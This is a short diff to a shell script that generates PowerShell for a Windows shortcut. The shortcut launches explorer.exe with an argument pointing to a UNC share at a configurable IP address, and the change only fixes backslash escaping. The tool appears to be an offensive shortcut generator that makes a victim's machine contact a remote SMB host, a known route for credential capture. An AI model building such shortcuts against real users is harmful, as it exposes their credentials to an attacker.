@@ -174,8 +174,9 @@ function generate() {
                     unc="\\\\\\${IP}\\\\${SHARE},select,${NAME}"
                 fi
             fi
-
-            script+="\$Shortcut.TargetPath = 'C:/Windows/explorer.exe'\n"
+            
+            # Escape the escape character (\e)
+            script+="\$Shortcut.TargetPath = 'C:\\Windows\\\\explorer.exe'\n"
             script+="\$Shortcut.Arguments = '/root,\"\\${unc}\"'\n"
         
         else
